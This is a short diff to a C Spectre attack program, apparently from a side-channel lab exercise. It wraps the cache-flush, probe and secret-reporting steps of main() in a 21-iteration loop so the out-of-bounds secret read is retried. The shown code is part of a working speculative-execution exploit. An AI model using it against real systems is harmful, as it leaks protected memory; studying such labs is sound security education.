@@ -79,10 +79,13 @@ void spectreAttack(size_t index_beyond)
 int main() {
   int i;
   uint8_t s;
-  size_t index_beyond = (size_t)(secret - (char*)buffer);
 
+for(int j=0;j<=20;j++)
+{
   flushSideChannel();
   for(i=0;i<256; i++) scores[i]=0; 
+  
+  size_t index_beyond = (size_t)(secret - (char*)buffer);
 
   for (i = 0; i < 1000; i++) {
     printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
@@ -99,5 +102,7 @@ int main() {
   printf("Reading secret value at index %ld\n", index_beyond);
   printf("The secret value is %d(%c)\n", max, max);
   printf("The number of hits is %d\n", scores[max]);
+}
+
   return (0); 
 }
